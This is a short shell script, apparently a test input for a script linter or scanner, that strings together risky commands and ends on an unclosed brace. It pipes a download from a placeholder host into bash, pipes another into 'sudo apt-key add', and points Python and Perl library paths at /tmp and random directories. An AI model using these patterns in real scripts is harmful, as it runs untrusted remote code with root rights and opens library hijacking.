#!/bin/sh
wget -O- http://example.org/ | bash
curl http://example.org/ | sudo apt-key add
gpg --recv-key 015475F5
export PYTHONPATH=/tmp/site-packages
export PERLLIB=/srv/$RANDOM
cat /proc/cpuinfo
{ 
